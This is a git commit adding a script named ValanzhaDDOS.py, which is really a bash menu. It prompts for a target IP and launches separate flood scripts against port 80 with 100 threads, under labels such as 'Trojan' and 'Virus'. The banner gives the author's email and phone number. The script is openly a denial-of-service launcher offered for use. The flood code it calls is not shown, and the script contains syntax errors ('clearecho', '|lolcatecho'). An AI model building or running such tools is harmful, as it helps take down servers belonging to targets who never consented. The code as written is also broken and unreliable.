bba631a812009351d4c03e03e4235ef2de5bf47f
Valanzha <53247478+Valanzha@users.noreply.github.com>
2019-07-30 12:30:20 +0700

    Add files via upload

---
+++ ValanzhaDDOS.py
@@ -0,0 +1,47 @@
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+clear
+toilet -f slant " ValanzhaDDOS " |lolcat
+echo
+echo
+echo $blue"=================================================="
+echo $purple"Autor  : Valanzha Quen"
+echo $green"Version: 1.0"
+echo $purple"Contact: tanniza047@gmail.com / 083852572837"
+echo $blue"=================================================="
+echo $yellow"        JANGAN DI RECODE YA ZEYENK...           "
+echo $cyan"   KECUP MANI DARI VALANZHA QUEEN EMMUAACH...   "
+echo $purple"---------------------------------------------------"
+echo $green"[1]. Valanzha Trojan"
+echo $green"[2]. Valanzha Droid"
+echo $green"[3]. Valanzha Hammer"
+echo $green"[4]. Valanzha Virus"
+echo $red"[0]. EXIT"
+echo $white"-----------------------------------------------------"
+echo $yellow"Masukkan Pilihan Kamu Zeyenkk..."
+read -p "Pilih=>" bro;
+echo 
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+toilet -f slant "Valanzha Trojan" | lolcat
+echo $red"MASUKKAN IP TARGET"
+read -p "==>" ipt
+clearecho
+python win.32.64.NT.py -s$ipt -p80 -t100
+fi
+
+if [ $bro =2 ] || [ $bro = 2 ]
+then
+toilet -f slant "Valanzha Droid" |lolcatecho
+echo $red"MASUKKAN IP TARGET"
+read -p "==>" ipt
+clear
+echo
+python andromeda.py -s$ipt -p80 -t100
+fi
